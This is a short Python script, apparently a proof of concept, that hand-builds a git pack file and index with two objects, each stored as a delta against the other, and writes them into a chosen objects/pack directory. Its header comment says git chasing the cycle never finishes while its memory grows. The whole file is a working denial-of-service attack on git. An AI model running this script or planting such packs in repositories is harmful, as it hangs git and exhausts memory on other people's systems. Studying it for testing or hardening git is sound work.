# A pack of two objects, each a delta against the other, as a session can
# write into its own .git/objects: git chasing it never finishes, and its
# memory grows while it tries.  cyclic-pack.py OID-A OID-B PACK-DIR
import hashlib, struct, sys, zlib


def header(kind, size):
    out = []
    c = (kind << 4) | (size & 15)
    size >>= 4
    while size:
        out.append(c | 0x80)
        c = size & 0x7F
        size >>= 7
    out.append(c)
    return bytes(out)


def varint(n):
    out = []
    while True:
        c = n & 0x7F
        n >>= 7
        if n:
            out.append(c | 0x80)
        else:
            out.append(c)
            return bytes(out)


a, b, pack_dir = bytes.fromhex(sys.argv[1]), bytes.fromhex(sys.argv[2]), sys.argv[3]
delta = varint(10) + varint(10) + bytes([0x80 | 0x10 | 0x01, 0, 10])
body, offsets, offset = b"", [], 12
for base in (b, a):  # a against b, b against a: REF_DELTA, type 7
    offsets.append(offset)
    entry = header(7, len(delta)) + base + zlib.compress(delta)
    body += entry
    offset += len(entry)
pack = b"PACK" + struct.pack(">II", 2, 2) + body
pack += hashlib.sha1(pack).digest()

entries = sorted(zip([a, b], offsets))
fanout = [0] * 256
for name, _ in entries:
    for i in range(name[0], 256):
        fanout[i] += 1
idx = b"\xfftOc" + struct.pack(">I", 2) + b"".join(struct.pack(">I", f) for f in fanout)
idx += b"".join(name for name, _ in entries)
idx += b"".join(struct.pack(">I", 0) for _ in entries)
idx += b"".join(struct.pack(">I", o) for _, o in entries)
idx += pack[-20:]
idx += hashlib.sha1(idx).digest()
name = pack[-20:].hex()
open(f"{pack_dir}/pack-{name}.pack", "wb").write(pack)
open(f"{pack_dir}/pack-{name}.idx", "wb").write(idx)
